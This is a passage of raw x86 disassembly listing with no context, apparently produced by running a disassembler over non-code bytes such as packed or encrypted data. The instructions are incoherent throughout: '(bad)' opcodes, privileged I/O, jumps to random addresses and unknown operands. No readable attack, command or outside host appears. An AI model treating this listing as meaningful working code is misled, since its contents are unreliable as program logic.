  40199b:	cmp    BYTE PTR [ebp+edi*4-0x5b6b5ae5],al
  4019a2:	xor    ch,BYTE PTR ds:0xd27685cf
  4019a8:	loop   0x40199c
  4019aa:	ror    edi,0x9e
  4019ad:	ret    0xb049
  4019b0:	gs out 0xff,al
  4019b3:	xor    eax,DWORD PTR [edx]
  4019b5:	pop    ebp
  4019b6:	ja     0x401a04
  4019b8:	adc    al,BYTE PTR [esi+ebp*8]
  4019bb:	aaa    
  4019bc:	add    bl,BYTE PTR [eax]
  4019be:	cmp    eax,0xb4cbab70
  4019c3:	jle    0x40198a
  4019c5:	adc    al,0x1c
  4019c7:	mov    al,ds:0x8246cf1
  4019cc:	adc    eax,0x7107573d
  4019d1:	jl     0x4019b5
  4019d3:	inc    ebx
  4019d4:	rcr    bl,cl
  4019d6:	sbb    al,0xc6
  4019d8:	sti    
  4019d9:	je     0x401a1b
  4019db:	sbb    edx,DWORD PTR [ecx+0x71]
  4019de:	mov    esi,edi
  4019e0:	mov    ebx,0x3f1bb0cf
  4019e5:	jmp    0x1ea1a102
  4019ea:	in     al,dx
  4019eb:	in     al,0xc
  4019ed:	jae    0x40199f
  4019ef:	or     ebp,ebx
  4019f1:	and    esi,DWORD PTR [ecx-0xa]
  4019f4:	add    eax,0x9d62931b
  4019f9:	pop    edx
  4019fa:	xor    al,0xf
  4019fc:	pop    esi
  4019fd:	push   esi
  4019fe:	dec    esp
  4019ff:	leave  
  401a00:	or     ebx,DWORD PTR [esi]
  401a02:	or     al,BYTE PTR [esi]
  401a04:	mov    esp,DWORD PTR [ebx+0x1cb407a3]
  401a0a:	add    DWORD PTR [edx-0x25b7f5d1],eax
  401a10:	sub    al,0x96
  401a12:	mov    esi,0x51850422
  401a17:	jb     0x4019cc
  401a19:	xor    al,BYTE PTR [esi-0x7057fc59]
  401a1f:	aas    
  401a20:	outs   dx,BYTE PTR ds:[esi]
  401a21:	call   0x907b080c
  401a26:	pop    ebp
  401a27:	add    DWORD PTR ss:[edx+0x36c5e533],0x57e48b65
  401a32:	or     BYTE PTR [eax],bl
  401a34:	and    ecx,DWORD PTR ds:0xd62ead0b
  401a3a:	das    
  401a3b:	dec    ecx
  401a3c:	add    ch,ah
  401a3e:	imul   BYTE PTR [edi]
  401a40:	ret    0x6861
  401a43:	dec    edx
  401a44:	cmp    BYTE PTR ds:[ebx],al
  401a47:	out    0xe0,al
  401a49:	mov    ds:0xf60a0931,eax
  401a4e:	xchg   BYTE PTR [edx],bh
  401a50:	mov    ebp,cr7
  401a53:	(bad)  
  401a54:	mov    ch,0x21
  401a56:	inc    ebp
  401a57:	fcomp  QWORD PTR [esi]
  401a59:	das    
  401a5a:	out    dx,al
  401a5b:	out    0x95,al
  401a5d:	cmp    eax,0xae0830fd
  401a62:	pop    es
  401a63:	or     BYTE PTR [edx],0xab
  401a66:	xchg   esi,eax
  401a67:	ss leave 
  401a69:	cmp    al,0xd7
  401a6b:	imul   DWORD PTR [esi+ecx*2-0x7f]
  401a6f:	js     0x401a16
  401a71:	mov    bl,BYTE PTR [esi+0x31829b83]
  401a77:	pop    edi
  401a78:	imul   esi,DWORD PTR [esi+0x6b6a58e6],0xffffff94
  401a7f:	jmp    0x401a27
  401a81:	fmul   QWORD PTR [esi+eiz*2]
  401a84:	fistp  WORD PTR [ebx]
  401a86:	or     ah,ch
  401a88:	xchg   esp,eax
  401a89:	mov    al,ds:0xb2b016c2
  401a8e:	inc    edi
  401a8f:	xchg   ecx,eax
  401a90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a91:	mov    bh,0xd
  401a93:	dec    esp
  401a94:	push   ebx
  401a95:	rol    BYTE PTR [ebp+0x7a7e7c88],0x47
  401a9c:	scas   al,BYTE PTR es:[edi]
  401a9d:	jl     0x401b12
  401a9f:	xor    dl,ah
  401aa1:	shl    BYTE PTR [edi],0x3a
  401aa4:	(bad)  
  401aa5:	pop    esp
  401aa6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401aa7:	adc    BYTE PTR [edi+0x37],cl
  401aaa:	shl    DWORD PTR [eax],0xb5
  401aad:	mov    esi,0x46d6ac9e
  401ab2:	es jl  0x401abe
  401ab5:	add    bh,ch
  401ab7:	push   eax
  401ab8:	imul   ebp,DWORD PTR [ebp-0x65175d87],0x5d
  401abf:	shl    DWORD PTR [edi],0x39
  401ac2:	adc    eax,0x5c10f27d
  401ac7:	mov    ds:0x2af308a9,eax
  401acc:	js     0x401a97
  401ace:	pop    eax
  401acf:	loope  0x401a8b
  401ad1:	into   
  401ad2:	shl    BYTE PTR [ebx-0x62a06025],0xd0
  401ad9:	imul   BYTE PTR [ebp+0x3cdb32fa]
  401adf:	bound  edx,QWORD PTR [esi-0x75ad6d80]
  401ae5:	sahf   
  401ae6:	mov    eax,0x8eaeb401
  401aeb:	sbb    al,0x6c
  401aed:	test   ah,0x80
  401af0:	or     eax,0x37b76f5e
  401af5:	mov    DWORD PTR [esi+0xd],ebp
  401af8:	jmp    0xc4f3900a
  401afd:	pop    es
  401afe:	paddsb mm1,QWORD PTR [edi]
  401b01:	imul   ebx,DWORD PTR [ebp-0x173c9460],0x90d72e9d
  401b0b:	pop    edx
  401b0c:	dec    edi
  401b0d:	jg     0x401b4b
  401b0f:	lahf   
  401b10:	jmp    0xaeda37ec
  401b15:	inc    esp
  401b16:	mov    WORD PTR [edi+0x24],?
  401b19:	dec    edx
  401b1a:	xor    al,0x5d
  401b1c:	pushf  
  401b1d:	in     al,dx
  401b1e:	mov    dl,0x95
  401b20:	xchg   ebp,eax
  401b21:	pop    ds
  401b22:	push   ds
  401b23:	jge    0x401b1f
  401b25:	jns    0x401b62
  401b27:	mov    esp,0x24fa135
  401b2c:	(bad)  
  401b2d:	(bad)  
  401b2e:	sbb    BYTE PTR [eax+0x5422bc0],ah
  401b34:	mov    eax,0xff47a401
  401b39:	ret    
  401b3a:	add    edi,DWORD PTR [edx+0x5c1070ec]
  401b40:	xor    dl,0xf1
  401b43:	adc    al,0xb9
  401b45:	or     al,0xdd
  401b47:	jle    0x401b04
  401b49:	adc    edi,edi
  401b4b:	leave  
  401b4c:	fiadd  WORD PTR [ebp+0x6]
  401b4f:	jnp    0x401adb
  401b51:	je     0x401b5f
  401b53:	xor    al,0x6d
  401b55:	inc    esp
  401b56:	repz jl 0x401b97
  401b59:	and    ecx,DWORD PTR ds:0x93477b86
  401b5f:	mov    ebx,0xfbbc158e
  401b64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b65:	iret   
  401b66:	inc    edx
  401b67:	les    esp,FWORD PTR [edx+0x14]
  401b6a:	(bad)  [esi+esi*2-0x7c8bb311]
  401b71:	cmp    al,0x88
  401b73:	std    
  401b74:	jbe    0x401bab
  401b76:	cwde   
  401b77:	sbb    DWORD PTR [eax+0x71],edi
  401b7a:	sub    ebx,DWORD PTR [ebp-0x74b10b41]
  401b80:	cmp    al,0x79
  401b82:	popf   
  401b83:	cmp    bh,BYTE PTR [ecx]
  401b85:	mov    edi,0xc9d1849d
  401b8a:	retf   
  401b8b:	xchg   ebp,eax
  401b8c:	or     al,0xe1
  401b8e:	and    BYTE PTR [eax],bl
  401b90:	mov    eax,ds:0x1f57c17a
  401b95:	ret    0xabe
  401b98:	ins    BYTE PTR es:[edi],dx
  401b99:	xchg   esp,eax
  401b9a:	pop    ds
  401b9b:	xchg   DWORD PTR [ebp-0x2],ecx
  401b9e:	dec    ebx
  401b9f:	xor    al,0x68
  401ba1:	outs   dx,DWORD PTR ds:[esi]
  401ba2:	adc    cl,al
  401ba4:	mov    bh,0xec
  401ba6:	pop    esi
  401ba7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ba8:	sbb    edi,DWORD PTR [ecx-0x3d7ab368]
  401bae:	loope  0x401c0d
  401bb0:	adc    ecx,DWORD PTR [edi+0x1596cc4b]
  401bb6:	mov    esp,0xd07ad4bf
  401bbb:	push   ecx
  401bbc:	xor    dh,ch
  401bbe:	loop   0x401bcd
  401bc0:	dec    ebp
  401bc1:	jne    0x401b6f
  401bc3:	arpl   WORD PTR [ecx+0x58],ax
  401bc6:	sbb    BYTE PTR [edx-0x64b521f5],ah
  401bcc:	mov    ?,esi
  401bce:	fwait
  401bcf:	mov    edi,es
  401bd1:	inc    esp
  401bd2:	push   ebx
  401bd3:	adc    eax,ecx
  401bd5:	not    BYTE PTR [edi]
  401bd7:	mov    al,0x8b
  401bd9:	mulps  xmm5,xmm0
  401bdc:	shl    bl,0x51
  401bdf:	mov    bh,0x3f
  401be1:	out    0xfb,eax
  401be3:	cmp    bh,BYTE PTR [eax+0x4d44665b]
  401be9:	iret   
  401bea:	dec    ebp
  401beb:	cmp    BYTE PTR [esi],dh
  401bed:	das    
  401bee:	pusha  
  401bef:	in     eax,0xc6
  401bf1:	push   edi
  401bf2:	pop    esi
  401bf3:	add    al,0x4a
  401bf5:	aaa    
  401bf6:	aad    0xfa
  401bf8:	retf   
  401bf9:	stc    
  401bfa:	outs   dx,BYTE PTR ds:[esi]
  401bfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bfc:	sub    dh,al
  401bfe:	int3   
  401bff:	dec    edi
  401c00:	add    BYTE PTR [edx-0x5be16510],0x3f
  401c07:	push   0xd65cd47e
  401c0c:	dec    edi
  401c0d:	ret    
  401c0e:	mov    BYTE PTR [eax-0x29de1564],al
  401c14:	pop    eax
  401c15:	xor    edx,edi
  401c17:	or     DWORD PTR [edx+0x6d],edx
  401c1a:	je     0x401c32
  401c1c:	add    cl,ah
  401c1e:	idiv   BYTE PTR [eax-0x6a]
  401c21:	je     0x401be9
  401c23:	mov    edi,0x4603bcd4
  401c28:	clc    
  401c29:	inc    esi
  401c2a:	mov    ch,0x4b
  401c2c:	push   edx
  401c2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c2e:	mov    cl,0xdf
  401c30:	mov    BYTE PTR [edx],bh
  401c32:	out    0x6b,al
  401c34:	xor    cl,ah
  401c36:	adc    al,ah
  401c38:	adc    eax,0x68155191
  401c3d:	test   DWORD PTR [eax+eax*4],0x6688be86
  401c44:	push   cs
  401c45:	test   DWORD PTR [ebp+0x38],0x6f6b5e52
  401c4c:	jbe    0x401cb3
  401c4e:	cmp    edi,DWORD PTR [eax+0x3209c9bb]
  401c54:	sbb    dl,cl
  401c56:	ins    DWORD PTR es:[edi],dx
  401c57:	push   0x4f85a55
  401c5c:	mov    gs,WORD PTR [eax-0x137e9e38]
  401c62:	imul   ebx,DWORD PTR [ebp+0x760ee26e],0x56
  401c69:	xchg   ecx,eax
  401c6a:	jb     0x401c50
  401c6c:	mov    ecx,0xbb928ca5
  401c71:	push   esi
  401c72:	inc    esi
  401c73:	ficom  WORD PTR [esi-0x19]
  401c76:	dec    ebx
  401c77:	mov    cl,0x25
  401c79:	ror    BYTE PTR [esi+edi*1],cl
  401c7c:	jmp    0x401cc0
  401c7e:	xchg   esi,eax
  401c7f:	lock push eax
  401c81:	pop    ebp
  401c82:	sub    DWORD PTR [ebx-0x92232a2],ebx
  401c88:	dec    ebp
  401c89:	sub    esp,DWORD PTR [eax-0x42938bf3]
  401c8f:	fldlg2 
  401c91:	mov    ds:0xdd2222eb,al
  401c96:	cmp    dh,BYTE PTR [edx-0x73]
  401c99:	fild   WORD PTR [esi-0x48]
  401c9c:	mov    ds:0x67e6a68f,eax
  401ca1:	xchg   BYTE PTR [edx+0x31],al
  401ca4:	adc    al,BYTE PTR ds:0xa057b495
  401caa:	jmp    0xad62718e
  401caf:	daa    
  401cb0:	jp     0x401c54
  401cb2:	lahf   
  401cb3:	xlat   BYTE PTR ds:[ebx]
  401cb4:	pop    ecx
  401cb5:	aam    0x6e
  401cb7:	sti    
  401cb8:	add    ecx,0xa74cf018
  401cbe:	xlat   BYTE PTR ds:[ebx]
  401cbf:	in     al,0x29
  401cc1:	mov    al,ds:0x89d853db
  401cc6:	xchg   edi,eax
  401cc7:	or     edi,0x856ca62b
  401ccd:	mov    dl,0x1d
  401ccf:	into   
  401cd0:	mov    ecx,0x24d7a9a4
  401cd5:	mov    DWORD PTR [edx],ebx
  401cd7:	add    al,cl
  401cd9:	imul   edx,DWORD PTR [esi+ecx*2+0x36e3b3bf],0xbf54e70d
  401ce4:	jno    0x401d4e
  401ce6:	xchg   ecx,eax
  401ce7:	sub    DWORD PTR cs:[esi+ebp*8],edx
  401ceb:	sti    
  401cec:	adc    eax,0x99a7523c
  401cf1:	int3   
  401cf2:	daa    
  401cf3:	sbb    ebx,0x2a7a0b0e
  401cf9:	mov    bl,0x86
  401cfb:	sub    eax,esp
  401cfd:	dec    esi
  401cfe:	cmp    BYTE PTR [ebx-0x20],bh
  401d01:	imul   ebp,ecx,0x83686b6f
  401d07:	jae    0x401c8d
  401d09:	mov    ebx,0x3863c71a
  401d0e:	nop
  401d0f:	xchg   BYTE PTR [ebp+0x29e69a10],dl
  401d15:	sti    
  401d16:	outs   dx,BYTE PTR ds:[esi]
  401d17:	mov    bl,0xf0
  401d19:	xor    bl,BYTE PTR [edx-0x8]
  401d1c:	xchg   edx,eax
  401d1d:	sub    BYTE PTR [eax-0x1df992c0],0xac
  401d24:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  401d26:	std    
  401d27:	xor    BYTE PTR [eax+0x43],ah
  401d2a:	test   al,0x25
  401d2c:	cmc    
  401d2d:	cdq    
  401d2e:	jecxz  0x401cf2
  401d30:	cmp    DWORD PTR [edi+ecx*4-0x28],0xa547ced4
  401d38:	and    DWORD PTR [eax-0x38],ebx
  401d3b:	fwait
  401d3c:	call   0x4b96adfc
  401d41:	repnz (bad) 
  401d43:	add    BYTE PTR [ebx],0x23
  401d46:	stos   DWORD PTR es:[edi],eax
  401d47:	inc    eax
  401d48:	mov    ecx,0x5784f17d
  401d4d:	leave  
  401d4e:	(bad)  
  401d4f:	xlat   BYTE PTR ds:[ebx]
  401d50:	adc    BYTE PTR [esi],ah
  401d52:	and    al,0x35
  401d54:	scas   eax,DWORD PTR es:[edi]
  401d55:	sbb    eax,0x11151211
  401d5a:	dec    ecx
  401d5b:	dec    eax
  401d5c:	fadd   QWORD PTR [eax]
  401d5e:	inc    eax
  401d5f:	sub    ch,BYTE PTR [edx+ebx*4]
  401d62:	arpl   WORD PTR [eax],ax
  401d64:	mov    bl,BYTE PTR [edx-0x1c08e8f6]
  401d6a:	xor    al,0xb8
  401d6c:	(bad)  es:[edx+0x57ed1262]
  401d73:	xor    al,0x3b
  401d75:	adc    BYTE PTR [eax-0x241dce0e],dl
  401d7b:	xchg   esi,eax
  401d7c:	sbb    al,0x2
  401d7e:	mov    eax,ds:0x46520e5b
  401d83:	mov    DWORD PTR [ebp-0x16194d50],0x9fa01d88
  401d8d:	pop    ds
  401d8e:	sbb    al,0x5a
  401d90:	mov    al,0xb5
  401d92:	cmp    edx,eax
  401d94:	je     0x401d43
  401d96:	add    eax,0x3dad0999
  401d9b:	dec    edx
  401d9c:	std    
  401d9d:	xchg   ebp,eax
  401d9e:	ins    BYTE PTR es:[edi],dx
  401d9f:	(bad)  
  401da0:	jp     0x401df5
  401da2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401da3:	sahf   
  401da4:	outs   dx,DWORD PTR ds:[esi]
  401da5:	add    edi,0xeb6152cb
  401dab:	push   0xfe4d03cd
  401db0:	xor    dh,ch
  401db2:	(bad)  
  401db3:	jb     0x401e05
  401db5:	cmc    
  401db6:	xchg   esi,eax
  401db7:	sbb    eax,0x2399337e
  401dbc:	adc    eax,0x209293a7
  401dc1:	imul   ecx,esi,0x5e
  401dc4:	xchg   bh,al
  401dc6:	xchg   ecx,eax
  401dc7:	jb     0x401dbf
  401dc9:	test   cl,dh
  401dcb:	push   edi
  401dcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401dcd:	sbb    eax,0x6e1c0519
  401dd2:	inc    sp
  401dd4:	add    bh,BYTE PTR [ecx+eiz*2-0x7a]
  401dd8:	lea    esp,[eax+eax*4-0x7694372d]
  401ddf:	inc    ecx
  401de0:	xlat   BYTE PTR ds:[ebx]
  401de1:	jg     0x401e1c
  401de3:	push   ecx
  401de4:	fisttp DWORD PTR [edi+0x5cddec71]
  401dea:	and    dh,al
  401dec:	pop    ebp
  401ded:	clc    
  401dee:	fwait
  401def:	pop    ebp
  401df0:	push   0x8404d014
  401df5:	call   0xa06e:0x5d8cd9b8
  401dfc:	push   ebp
  401dfd:	xlat   BYTE PTR ds:[ebx]
  401dfe:	cmp    esi,ebp
  401e00:	das    
  401e01:	mov    WORD PTR [edi+0x4a],gs
  401e04:	adc    BYTE PTR [edx-0x3592c92b],dl
  401e0a:	push   ebp
  401e0b:	mov    ah,0x16
  401e0d:	or     eax,0x38261e90
  401e12:	pop    ecx
  401e13:	jb     0x401ddc
  401e15:	fsub   QWORD PTR [ecx-0x4e]
  401e18:	dec    edx
  401e19:	arpl   WORD PTR [edx],dx
  401e1b:	and    BYTE PTR ds:0xab606683,ch
  401e21:	jae    0x401e5c
  401e23:	jmp    0x3465839
  401e28:	stc    
  401e29:	fucom  st(7)
  401e2b:	xor    esi,DWORD PTR [ebp+ebp*4-0x44]
  401e2f:	and    DWORD PTR [ebx],eax
  401e31:	push   eax
  401e32:	retf   0xaeb0
  401e35:	add    esi,DWORD PTR [ecx+eiz*8]
  401e38:	mov    DWORD PTR [esi],ebx
  401e3a:	mov    ah,0x94
  401e3c:	mov    esp,0x505ec194
  401e41:	ja     0x401ea1
  401e43:	push   ds
  401e44:	dec    ebp
  401e45:	inc    ebp
  401e46:	mov    DWORD PTR [eax-0x15850ea4],ecx
  401e4c:	aam    0xf2
  401e4e:	vdivpd xmm3,xmm1,XMMWORD PTR [esi+ebx*4-0x74]
  401e54:	in     al,dx
  401e55:	clc    
  401e56:	pop    ss
  401e57:	ret    
  401e58:	add    al,0xa6
  401e5a:	cld    
  401e5b:	sub    dl,BYTE PTR ds:0x2e5d728e
  401e61:	xchg   edx,eax
  401e62:	aad    0x2b
  401e64:	sar    ch,cl
  401e66:	mov    ebp,0x29ad2b0f
  401e6b:	stos   DWORD PTR es:[edi],eax
  401e6c:	and    ch,BYTE PTR [edi-0x21]
  401e6f:	sub    BYTE PTR [edi-0x6ec79ce2],0x21
  401e76:	aad    0xfb
  401e78:	adc    ah,dh
  401e7a:	rcr    BYTE PTR [ebp+0x30],cl
  401e7d:	sbb    eax,0x44be5ca0
  401e82:	xlat   BYTE PTR ds:[ebx]
  401e83:	test   eax,0xd99ff24b
  401e88:	scas   eax,DWORD PTR es:[edi]
  401e89:	xor    al,0xd4
  401e8b:	sti    
  401e8c:	das    
  401e8d:	cli    
  401e8e:	sbb    BYTE PTR [ecx+0x10],0x7d
  401e92:	xlat   BYTE PTR ds:[ebx]
  401e93:	arpl   WORD PTR [edi-0x58],ax
  401e96:	xlat   BYTE PTR ds:[ebx]
  401e97:	mov    ch,0xfc
  401e99:	jmp    0x89fc4827
  401e9e:	cmp    esi,DWORD PTR [esi+0x7106e0e5]
  401ea4:	and    eax,0x97afc843
  401ea9:	and    eax,0xb2d70de1
  401eae:	lods   al,BYTE PTR ds:[esi]
  401eaf:	punpckhwd mm2,QWORD PTR [esi-0x3d6d3001]
  401eb6:	enter  0x6990,0x6e
  401eba:	pop    es
  401ebb:	pop    edi
  401ebd:	sub    ebp,DWORD PTR [esi-0x1c]
  401ec0:	push   ecx
  401ec1:	mov    esi,0x909ddb0f
  401ec6:	sbb    dl,BYTE PTR [esi+0x1f]
  401ec9:	xchg   edx,eax
  401eca:	push   ds
  401ecb:	fdivr  DWORD PTR [eiz*1-0x797dc2c6]
  401ed2:	mov    WORD PTR [edx+0x62],gs
  401ed5:	add    edx,esi
  401ed7:	into   
  401ed8:	xchg   DWORD PTR [edi-0x42],eax
  401edb:	inc    edx
  401edc:	xchg   BYTE PTR [edx+0x79],bh
  401edf:	or     cl,bl
  401ee1:	xchg   ebp,eax
  401ee2:	popa   
  401ee3:	inc    edi
  401ee4:	ds xchg esp,eax
  401ee6:	ds adc al,0x1c
  401ee9:	push   eax
  401eeb:	xchg   di,ax
  401eed:	int3   
  401eee:	cmp    dh,BYTE PTR [si-0x61]
  401ef2:	jmp    0x8359618d
  401ef7:	jmp    0x401ecc
  401ef9:	cli    
  401efa:	add    al,0x4e
  401efc:	jns    0x401eaf
  401efe:	pop    ebp
  401eff:	jae    0x401ee4
  401f01:	lods   al,BYTE PTR ds:[esi]
  401f02:	mov    edi,0x94b0ae30
  401f07:	inc    eax
  401f08:	call   0x6543a37
  401f0d:	js     0x401f33
  401f0f:	out    0x58,eax
  401f11:	in     al,0xbb
  401f13:	les    ebx,FWORD PTR [ebx]
  401f15:	(bad)  
  401f16:	(bad)  
  401f17:	sub    eax,0x898aa857
  401f1c:	dec    ecx
  401f1d:	mov    ebx,0xbdddcd04
  401f22:	xchg   BYTE PTR [ecx+0x24],al
  401f25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f26:	inc    esp
  401f27:	lea    eax,[ebx-0x6e]
  401f2a:	pop    ss
  401f2b:	enter  0x3860,0x67
  401f2f:	mov    al,ds:0xc582e371
  401f34:	dec    edi
  401f35:	(bad)  
  401f36:	jno    0x401eca
  401f38:	rcl    cl,cl
  401f3a:	xor    cl,BYTE PTR [esi-0x27]
  401f3d:	inc    edx
  401f3e:	clc    
  401f3f:	push   edx
  401f40:	fcmovnu st,st(5)
  401f42:	adc    edi,DWORD PTR [eax-0x73]
  401f45:	mul    BYTE PTR [edi+0x6cbe7759]
  401f4b:	(bad)  
  401f4c:	xchg   ebp,eax
  401f4d:	imul   eax,DWORD PTR [ebx-0x544ac69],0x23
  401f54:	fld    DWORD PTR [edx]
  401f56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f57:	jecxz  0x401fa0
  401f59:	imul   DWORD PTR [edx+0x2169f3b7]
  401f5f:	lds    ecx,FWORD PTR [edi]
  401f61:	mov    eax,ds:0x79525633
  401f66:	push   0x1eb79324
  401f6b:	mov    bh,0x4
  401f6d:	push   esi
  401f6e:	xchg   ebx,eax
  401f6f:	or     esp,DWORD PTR [ebp+edi*8-0x4c]
  401f73:	push   esp
  401f74:	std    
  401f75:	aaa    
  401f76:	push   eax
  401f77:	cdq    
  401f78:	retf   
  401f79:	mov    bl,0x84
  401f7b:	test   al,0xd1
  401f7d:	mov    al,ds:0x771ee995
  401f82:	fbld   TBYTE PTR [ecx-0x102e68b0]
  401f88:	inc    esi
  401f89:	sub    DWORD PTR [ebp+0x2f],edx
  401f8c:	add    eax,0x81552327
  401f91:	mov    esp,0x3e6dcb43
  401f96:	push   cs
  401f97:	jg     0x401f74
  401f99:	xor    al,0x64
  401f9b:	popf   
  401f9c:	xor    al,0xca
  401f9e:	in     eax,dx
  401f9f:	push   esp
  401fa0:	call   0xaed2db78
  401fa5:	dec    edi
  401fa6:	dec    esi
  401fa7:	leave  
  401fa8:	scas   al,BYTE PTR es:[edi]
  401fa9:	in     al,dx
  401faa:	mov    DWORD PTR [ebp+0x577d417f],ebp
  401fb0:	and    eax,0xa136fd3
  401fb5:	mov    esp,0x4f2fc3a4
  401fba:	clc    
  401fbb:	jp     0x40202d
  401fbd:	outs   dx,DWORD PTR gs:[esi]
  401fbf:	int    0xe3
  401fc1:	or     BYTE PTR [edx-0x50cd0296],ah
  401fc7:	icebp  
  401fc8:	sub    al,0xd0
  401fca:	cdq    
  401fcb:	imul   ebp,esp,0xaa8c5d59
  401fd1:	jge    0x402023
  401fd3:	sub    eax,0x87aa77a4
  401fd8:	xor    BYTE PTR [eax+0x17],ch
  401fdb:	adc    eax,0xe875cf67
  401fe0:	inc    ecx
  401fe1:	jo     0x402026
  401fe3:	cmc    
  401fe4:	in     eax,dx
  401fe5:	adc    ebp,ebx
  401fe7:	pop    eax
  401fe8:	enter  0x4696,0x59
  401fec:	enter  0xcbe4,0x8e
  401ff0:	rol    DWORD PTR [ebp-0x2e74cded],cl
  401ff6:	cli    
  401ff7:	loop   0x402073
  401ff9:	shl    al,0x84
  401ffc:	jp     0x401fe1
  401ffe:	dec    eax
  401fff:	out    dx,al
  402000:	jmp    0x402004
  402002:	xlat   BYTE PTR ds:[ebx]
  402003:	mov    ch,0x22
  402005:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402006:	mov    al,ds:0xf41a9636
  40200b:	xchg   ecx,eax
  40200c:	pop    es
  40200d:	ficomp DWORD PTR [esi-0x34]
  402010:	std    
  402011:	push   0xffffff89
  402013:	pop    eax
  402014:	push   ebx
  402015:	bound  esp,QWORD PTR [eax]
  402017:	fnstsw WORD PTR [ebx]
  402019:	xlat   BYTE PTR ds:[ebx]
  40201a:	inc    ebp
  40201b:	inc    ebp
  40201c:	and    eax,0x272d730e
  402021:	sub    ch,BYTE PTR [ebx]
  402023:	push   ecx
  402024:	pop    ss
  402025:	cdq    
  402026:	dec    ebp
  402027:	fidiv  DWORD PTR [eax+0x6f]
  40202a:	es mov esi,0x7e71d45f
  402030:	push   ds
  402031:	and    al,0x78
  402033:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402034:	ins    DWORD PTR es:[edi],dx
  402035:	dec    eax
  402036:	adc    dl,al
  402038:	lea    eax,[edi]
  40203a:	leave  
  40203b:	and    DWORD PTR [ebx-0x75d69d94],esi
  402041:	jb     0x402058
  402043:	xchg   edx,eax
  402044:	push   0xd57c6ea8
  402049:	dec    eax
  40204a:	fistp  QWORD PTR [ebx+0x179586d3]
  402050:	sbb    DWORD PTR [ecx-0x64],eax
  402053:	cli    
  402054:	push   0x1fb1a863
  402059:	dec    ebp
  40205a:	jae    0x4020cc
  40205c:	or     al,0x8f
  40205e:	stc    
  40205f:	lods   al,BYTE PTR ds:[esi]
  402060:	xchg   esi,eax
  402061:	(bad)  
  402062:	jno    0x4020d0
  402064:	ret    
  402065:	in     eax,0xe7
  402067:	setns  BYTE PTR [edi+0x68]
  40206b:	sbb    eax,0x3e88c31d
  402070:	in     eax,0xe1
  402072:	aas    
  402073:	add    ah,BYTE PTR [ebx]
  402075:	pop    ecx
  402076:	push   0xffffffeb
  402078:	ins    BYTE PTR es:[edi],dx
  402079:	mov    ecx,0x2fbc3d50
  40207e:	mov    ebp,0x13ca4605
  402083:	mov    ebp,0xc4c8258c
  402088:	loope  0x4020d3
  40208a:	or     dh,bh
  40208c:	imul   ecx,DWORD PTR [esi-0x4f],0xfe9c4448
  402093:	adc    esi,DWORD PTR [ebx-0x7]
  402096:	es scas al,BYTE PTR es:[edi]
  402098:	mov    bl,0x57
  40209a:	or     al,0xe7
  40209c:	jbe    0x4020c7
  40209e:	lahf   
  40209f:	fdiv   QWORD PTR [esi-0xeb6b723]
  4020a5:	les    edx,FWORD PTR [ebx]
  4020a7:	xor    BYTE PTR [ecx],bh
  4020a9:	xchg   ebp,eax
  4020aa:	push   es
  4020ab:	in     al,dx
  4020ac:	je     0x402031
  4020ae:	jecxz  0x402048
  4020b0:	loope  0x4020df
  4020b2:	sub    dl,BYTE PTR [esi]
  4020b4:	(bad)  
  4020b5:	dec    esp
  4020b6:	retf   0x36bb
  4020b9:	ret    
  4020ba:	lea    edi,[edi-0x777db209]
  4020c0:	and    DWORD PTR [ecx-0x41627dc6],edi
  4020c6:	cmc    
  4020c7:	dec    BYTE PTR [edi+0x30]
  4020ca:	add    al,0xda
  4020cc:	push   0xc218bf50
  4020d1:	mov    BYTE PTR [eax],cl
  4020d3:	push   es
  4020d4:	int3   
  4020d5:	ins    BYTE PTR es:[edi],dx
  4020d6:	or     eax,0x84057563
  4020db:	push   0x34147cbb
  4020e0:	mov    cl,0xbd
  4020e2:	fadd   QWORD PTR [edx]
  4020e4:	out    0xb3,eax
  4020e6:	jae    0x402124
  4020e8:	call   0x8c0e:0x9fa7de36
  4020ef:	jge    0x402099
  4020f1:	xor    eax,0x6f04354e
  4020f6:	mov    cl,BYTE PTR [esp+ebp*4+0xc]
  4020fa:	mov    dh,0x1e
  4020fc:	mov    ebp,0xc39533c3
  402101:	outs   dx,DWORD PTR ds:[esi]
  402102:	pop    edx
  402103:	repz sbb BYTE PTR [edx-0x53c3e097],ah
  40210a:	test   eax,0x3c06a3cd
  40210f:	adc    DWORD PTR [esi-0x28],0x48
  402113:	xchg   ebp,eax
  402114:	push   es
  402115:	sbb    ah,BYTE PTR [ebp-0x14]
  402118:	push   esp
  402119:	fidiv  DWORD PTR [ecx-0x623b8680]
  40211f:	shl    esi,0xae
  402122:	stos   BYTE PTR es:[edi],al
  402123:	cdq    
  402124:	mov    edi,0xe2ed9f50
  402129:	mov    ecx,DWORD PTR [eax]
  40212b:	cmp    ah,BYTE PTR [edx-0x6f887532]
  402131:	jns    0x402108
  402133:	mov    esi,DWORD PTR [ebx+0x33]
  402136:	(bad)  
  402138:	pusha  
  402139:	mov    ?,WORD PTR [ecx-0x93aec69]
  40213f:	jle    0x402125
  402141:	mov    bh,0xd
  402143:	or     eax,0xd81010ec
  402148:	mov    al,0x67
  40214a:	sub    al,BYTE PTR cs:[eax-0x80]
  40214e:	mov    ds:0x619df94a,al
  402153:	mov    esi,0x9fee72d7
  402158:	in     eax,dx
  402159:	mov    al,0xc8
  40215b:	ja     0x4020f1
  40215d:	mov    ds:0x72eba47f,eax
  402162:	or     bh,ch
  402164:	stos   BYTE PTR es:[edi],al
  402165:	cld    
  402166:	inc    ebp
  402167:	mov    DWORD PTR [edx-0x562aec25],0x11b58a21
  402171:	scas   al,BYTE PTR es:[edi]
  402172:	lock sbb DWORD PTR [eax+0x27],0xffffff82
  402177:	pop    ecx
  402178:	retf   0x78f2
  40217b:	cmp    DWORD PTR [edi],ebp
